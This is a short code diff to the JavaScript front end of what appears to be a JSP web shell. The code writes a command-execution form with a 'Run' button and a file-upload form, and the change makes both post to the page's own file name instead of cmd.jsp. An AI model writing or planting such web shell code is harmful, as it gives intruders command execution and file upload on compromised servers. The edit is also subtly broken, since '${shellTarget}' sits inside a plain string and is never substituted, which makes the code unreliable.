@@ -1,8 +1,11 @@
 document.write("<p>");
-var html = "<form method=post action='cmd.jsp'>\
+
+shellTarget=window.location.pathname.split('/').slice(-1)[0];
+
+var html = "<form method=post action='${shellTarget}'>\
 <input name='c' type=text><input type=submit value='Run'>\
 </form><hr>\
-<form action='cmd.jsp' method=post>\
+<form action='${shellTarget}' method=post>\
 Upload dir: <input name='a' type=text value='.'><br>\
 Select a file to upload: <input name='n' type='file' id='f'>\
 <input type='hidden' name='b' id='b'>\
